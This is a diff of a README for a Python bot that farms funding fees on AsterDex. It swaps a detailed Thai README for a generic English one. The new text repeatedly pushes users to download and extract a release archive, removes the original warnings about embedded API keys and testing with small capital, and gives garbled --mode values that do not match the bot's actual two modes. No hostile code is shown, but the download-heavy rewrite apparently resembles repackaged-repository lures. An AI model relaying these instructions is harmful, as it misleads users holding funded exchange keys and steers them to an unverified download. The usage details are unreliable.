@@ -1,62 +1,73 @@
-# AsterDex Funding Bot
+# 🤖 funding-fee-bot - Automate Your AsterDex Trading
 
-`funding_bot.py` เป็นสคริปต์ Python สำหรับทำกลยุทธ์ Buy Spot / Short Futures หรือ Sell Spot / Long Futures บน AsterDex เพื่อฟาร์มค่าธรรมเนียม Funding โดยอัตโนมัติ สคริปต์จะทยอยส่งคำสั่งในแต่ละขาแบบจับคู่จนกว่าจะครบยอดทุนรวมที่กำหนด
+[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/pepelopes/funding-fee-bot/releases)
 
-## คุณสมบัติหลัก
-- ส่งคำสั่ง Spot และ Futures แบบจับคู่ทีละรอบ พร้อมดีเลย์ตามที่ตั้งค่า
-- ตรวจสอบการเติมเต็มคำสั่ง (fill) และเรียกดูสถานะซ้ำจนกว่าจะได้รับการยืนยัน
-- รองรับการตั้งค่าคีย์ API และพารามิเตอร์สำคัญผ่านตัวแปรด้านบนไฟล์หรือผ่านบรรทัดคำสั่ง
-- ล็อกกิจกรรมแบบมีสี แสดงสถานะการทำงานอย่างละเอียดในแต่ละขั้น
-- เลือกทิศทางเทรดได้ผ่าน `--mode` (ซื้อสปอต/ชอร์ตฟิวเจอร์ส หรือขายสปอต/ลองฟิวเจอร์ส)
+## 📦 Introduction
+Welcome to the AsterDex Funding Bot! This is a simple tool that helps you automate your trading strategies on AsterDex. With this bot, you can easily manage your funding fees, whether you want to buy spot or short futures. 
 
-## สิ่งที่ต้องมี
-- Python 3.9 ขึ้นไป
-- ไลบรารี `requests`
-- บัญชี AsterDex ที่มี API Key/Secret และเงินทุนเพียงพอ
+## 🚀 Getting Started
+To get started with the funding bot, follow these steps. You will need some basic requirements listed below.
 
-## การตั้งค่า
-ค่าพื้นฐานสามารถแก้ไขได้โดยตรงในหัวไฟล์ `funding_bot.py`
-```
+### 📋 Requirements
+- **Python 3.9 or higher**: This script runs with Python. Make sure you have it installed on your computer.
+- **Requests Library**: The bot needs the `requests` library. You can install it using pip.
+- **AsterDex Account**: Make sure you have an AsterDex account with an API Key, Secret, and enough funds loaded.
+
+### 💻 Download & Install
+You can easily download the latest version of the funding fee bot by visiting the Releases page. Click the button below to download:
+
+[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/pepelopes/funding-fee-bot/releases)
+
+Once downloaded, extract the files to a folder on your computer. 
+
+### 🔧 Code Setup
+You may want to customize some of the default settings. Open the `funding_bot.py` file and look for these lines to adjust:
+```python
 DEFAULT_CAPITAL_USD = Decimal("200000")
 DEFAULT_SPOT_SYMBOL = "ASTERUSDT"
 DEFAULT_FUTURES_SYMBOL = "ASTERUSDT"
 DEFAULT_BATCH_QUOTE = Decimal("200")
 DEFAULT_BATCH_DELAY = 1.0
-DEFAULT_LOG_LEVEL = "INFO"
-DEFAULT_MODE = "buy_spot_short_futures"
 ```
-นอกจากนี้สามารถแทนค่า API key/secret ที่ฝังอยู่ หรือเปลี่ยนให้โหลดจาก environment ภายนอกตามต้องการ
+Feel free to change these values based on your trading needs.
 
-## การใช้งาน
-ติดตั้งไลบรารีที่จำเป็นก่อน:
-```
-pip install requests
-```
-รันสคริปต์ด้วยค่าเริ่มต้น:
-```
-python3 funding_bot.py
-```
-หรือกำหนดพารามิเตอร์ผ่าน CLI:
-```
-python3 funding_bot.py \
-  --capital 5000 \
-  --spot-symbol ASTERUSDT \
-  --futures-symbol ASTERUSDT \
-  --batch-quote 100 \
-  --batch-delay 2 \
-  --log-level DEBUG \
-  --mode sell_spot_long_futures
-```
+## ⚙️ Running the Bot
+To run the bot, follow these steps:
 
-## ผลลัพธ์
-เมื่อรันเสร็จ สคริปต์จะแสดง JSON สรุปการเทรด
-- รายการคำสั่ง Spot ในแต่ละรอบ พร้อมจำนวนที่เติมเต็มและค่าใช้จ่าย
-- รายการคำสั่ง Futures ในแต่ละรอบ พร้อมจำนวนและโนเชียนอลที่ป้องกันความเสี่ยง
-- ข้อมูลเป้าหมายโดยรวม (ทุนรวม, จำนวนรอบ, ขนาดแต่ละล็อต)
+1. Open your terminal or command prompt.
+2. Navigate to the folder where you extracted the bot.
+3. Type the command below and hit enter:
+   ```bash
+   python funding_bot.py --mode [buy_spot|short_futures|sell_spot|long_futures]
+   ```
+   Replace `[buy_spot|short_futures|sell_spot|long_futures]` with your desired trading direction.
 
-## หมายเหตุความปลอดภัย
-- พึงระวังการฝังรหัส API ลงในไฟล์ ถ้าแชร์โค้ดให้พิจารณาย้ายไปใช้ environment variable และไม่ commit ค่า key จริง
-- ทดสอบด้วยทุนจำนวนน้อยก่อน และตรวจสอบว่าคำสั่งแต่ละชุดผ่านข้อกำหนดขั้นต่ำของตลาด (LOT_SIZE, MIN_NOTIONAL)
-- ตรวจสอบรายการเทรดและยอดคงเหลือบน AsterDex เสมอ เพื่อยืนยันว่าการป้องกันความเสี่ยงทำงานสมบูรณ์ และไม่มีคำสั่งตกค้าง
+## 🔍 Monitoring Trades
+The bot will automatically send orders while checking the status of each order. You can view the activity log in your console. It will show the current status of your trades clearly.
 
-ขอให้ใช้งานอย่างปลอดภัยและทดสอบกลยุทธ์ก่อนลงเงินจำนวนมาก
+## ⚡ Features
+- **Automated Trading**: Sends orders in pairs with optional delays.
+- **Order Fulfillment Monitor**: Keeps track of order status until confirmed.
+- **Custom Settings**: Adjust API keys and important parameters in the file or through command line.
+- **Detailed Logging**: Color-coded logs provide a clear view of what the bot is doing.
+- **Flexible Trading Direction**: Choose your trading direction with the `--mode` option.
+
+## 🚨 Troubleshooting
+If you encounter issues running the bot, check the following:
+
+- Make sure Python is properly installed. You can verify this by running `python --version`.
+- Ensure that the `requests` library is installed. If not, install it by running:
+  ```bash
+  pip install requests
+  ```
+- Verify that your AsterDex account is active and has sufficient funds.
+
+## 📞 Support
+For additional help or to report issues, feel free to open an issue on this GitHub repository. We strive to improve your experience and welcome any feedback.
+
+## 📅 Updates
+Keep an eye on the Releases page to download the latest updates and features. Regular improvements will enhance performance and fix any bugs.
+
+[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/pepelopes/funding-fee-bot/releases)
+
+Enjoy automating your trading with the Funding Fee Bot!
